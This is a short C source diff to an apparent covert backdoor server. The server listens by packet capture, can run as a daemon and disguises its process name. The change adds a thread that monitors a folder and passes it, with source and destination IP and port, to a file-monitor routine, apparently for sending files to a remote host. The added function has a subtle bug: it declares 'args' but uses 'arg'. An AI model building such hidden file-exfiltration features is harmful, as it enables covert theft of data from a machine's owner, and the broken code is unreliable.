@@ -64,6 +64,8 @@ int start_server()
 	pcap_t * nic_handle = NULL;
 	struct bpf_program fp;
 
+	pthread_t file_monitor_thread;
+	pthread_create(&file_monitor_thread, NULL, fileMonitorThread, (void *) &user_options);
 	startPacketCapture(nic_handle, fp, FROM_CLIENT, NULL, user_options.listen_port);
 	stopPacketCapture(nic_handle, fp);
 
@@ -219,4 +221,11 @@ void print_server_info()
 {
 	fprintf(stderr, "Daemon mode %s.\n", user_options.daemon_mode ? "enabled" : "disabled");
 	fprintf(stderr, "Process name masked as: %s\n", MASK_NAME);
+}
+
+
+void* fileMonitorThread(void* args){
+	struct options * server_opts = (struct options *) arg;
+	
+	initFileMonitor(server_opts->folder, server_opts->src_ip, server_opts->dest_ip, server_opts->dest_port);
 }
